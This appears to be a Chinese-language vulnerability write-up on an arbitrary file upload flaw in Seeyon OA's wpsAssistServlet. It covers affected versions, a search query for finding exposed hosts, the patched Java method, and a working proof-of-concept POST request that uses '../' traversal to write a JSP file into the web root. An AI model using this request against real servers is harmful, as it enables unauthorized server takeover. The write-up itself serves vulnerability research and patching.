# 致远OA wpsAssistServlet 任意文件上传漏洞

## 漏洞描述

致远OA wpsAssistServlet接口存在任意文件上传漏洞，攻击者通过漏洞可以发送特定的请求包上传恶意文件，获取服务器权限

## 漏洞影响

<a-checkbox checked>致远OA A6、A8、A8N (V8.0SP2，V8.1，V8.1SP1)</a-checkbox></br>

<a-checkbox checked>致远OA G6、G6N (V8.1、V8.1SP1)</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="致远互联-OA" && title="V8.0SP2"</a-checkbox></br>

## 漏洞复现

产品主页

![img](../../../.vuepress/public/img/1658806205627-07ce1bd0-adf1-4aae-9f3a-a6885bf8bfd7.png)

下载补丁220706-S004 ，对比修改的文件

![img](../../../.vuepress/public/img/1658806584119-32f25f71-5351-4781-ab5b-7435032ec7ec.png)

主要修改的是 `com.seeyon.ctp.common.wpsassist.manager.WpsAssistManagerImpl.oaSaveFile` 这个方法

```php
private Map<String, Object> oaSaveFile(HttpServletRequest request, Map<String, Object> param) throws Exception {
        Map<String, Object> result = Maps.newHashMap();
        result.put(BusinessKey.OfficeTransResultFlag.getCode(), (Object)null);
        Long fileId = MapUtils.getLong(param, "fileId");
        log.info("wpsAssist SaveFile start!fileId=" + fileId);
        String newPdfFileId = MapUtils.getString(param, "newPdfFileId");
        if (Strings.isNotBlank(newPdfFileId)) {
            fileId = Long.valueOf(newPdfFileId);
        }

        String realFileType = MapUtils.getString(param, "realFileType");
        String tempFileIdPathSuffix = SystemEnvironment.getSystemTempFolder() + File.separator + fileId + realFileType;
        Long count = this.saveFileToPath(request, tempFileIdPathSuffix);
        result.put(BusinessKey.FileSize.getCode(), count);
        result.putAll(this.createOfficeTransCacheFile(fileId, tempFileIdPathSuffix, MapUtils.getString(param, "canTransFileType")));
        param.put(BusinessKey.OfficeTransResultFlag.getCode(), result.get(BusinessKey.OfficeTransResultFlag.getCode()));
        this.copyToUploadAndTrans(param);
        return result;
    }
```

向上追溯调用的 oaSaveFile方法的代码

![img](../../../.vuepress/public/img/1658806789623-07df56ba-fe62-4c0d-9374-11cfc3077bdf.png)

![img](../../../.vuepress/public/img/1658807010120-47006179-52db-4d27-8e18-fe00dbc8482a.png)

在 `com.seeyon.ctp.common.wpsassist.WpsAssistServlet.doPost` 中，flag参数为save时，可以调用文件上传接口

![img](../../../.vuepress/public/img/1658809800167-1f074e5b-88b2-468c-b29f-794f8d5ddfaa.png)

`C://Seeyon/A6/base/temporary` 为默认上传的位置，但 `realFileType, fileId` 参数可控，可以通过 ../ 遍历上传到任意目录下，验证POC

```php
POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2 HTTP/1.1
Host: 
Content-Length: 349
Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
Accept-Encoding: gzip

--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name="upload"; filename="123.xls"
Content-Type: application/vnd.ms-excel

<% out.println("seeyon_vuln");%>
--59229605f98b8cf290a7b8908b34616b--
```



![img](../../../.vuepress/public/img/1658810152744-1a171b0d-25f0-4c99-9ff4-4202c66d40b3.png)

![img](../../../.vuepress/public/img/1658810231876-43f625d6-dc8f-421d-96ae-f753722bf2c5.png)